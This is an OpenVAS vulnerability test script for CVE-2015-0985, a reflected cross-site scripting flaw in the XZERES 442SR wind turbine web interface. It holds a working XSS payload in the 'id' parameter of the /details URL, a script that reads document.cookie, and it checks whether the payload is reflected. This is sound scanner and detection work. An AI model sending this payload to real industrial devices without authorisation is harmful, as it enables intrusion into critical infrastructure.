###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_442SR_wind_turbine_xss_vuln.nasl 12109 2018-10-26 06:57:05Z cfischer $
#
# XZERES 442SR Wind Turbine Web Interface Cross Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:xzeres:442sr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807021");
  script_version("$Revision: 12109 $");
  script_cve_id("CVE-2015-0985");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 08:57:05 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-01-04 13:19:12 +0530 (Mon, 04 Jan 2016)");
  script_name("XZERES 442SR Wind Turbine Web Interface Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with XZERES 442SR
  Wind Turbine Web Interface and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Wind Turbine web interface does not properly
  sanitize input passed via the 'id' HTTP GET parameter to details script before
  returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server.");

  script_tag(name:"affected", value:"XZERES 442SR Wind Turbine.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Dec/116");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-15-342-01");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/135067/xzeres-xss.txt");
  script_xref(name:"URL", value:"http://www.xzeres.com/wind-turbine-products");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xzeres_442SR_wind_turbine_detect.nasl");
  script_mandatory_keys("442SR/Wind/Turbine/Installed");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!windPort = get_app_port(cpe:CPE)){
  exit(0);
}

url = '/details?object=Inverter&id=2<script>alert(document.cookie);</script>';

req = http_get(item: url, port:windPort);
res = http_keepalive_send_recv(port:windPort,data:req, bodyonly:FALSE);

if(http_vuln_check(port:windPort, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\);</script>",
   extra_check:make_list("VOLTAGE","CURRENT", "POWER")))
{
  report = report_vuln_url( port:windPort, url:url );
  security_message(port:windPort, data:report);
  exit(0);
}
